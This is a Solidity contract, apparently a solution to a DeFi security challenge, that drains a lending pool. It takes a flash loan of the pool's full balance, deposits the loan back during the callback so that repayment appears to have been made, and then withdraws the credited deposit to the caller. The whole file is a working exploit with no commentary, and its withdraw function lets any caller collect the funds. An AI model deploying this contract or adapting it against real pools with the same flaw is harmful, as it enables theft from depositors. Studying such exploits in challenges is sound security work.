//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract IFlashLoanEtherReceiver {
    uint256 public amount;
    address payable public pool;

    constructor(address payable _pool) {
        pool = _pool;
        amount = pool.balance;
    }

    function takeLoan() public {
        (bool success, ) = pool.call(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
        require(success, "Failed to get Loan");
    }

    function execute() external payable {
        (bool success, ) = pool.call{value: amount}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Failed to deposit");
    }

    function withdrawToPlayer() public {
        (bool success, ) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Failed to withdraw from pool");
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}
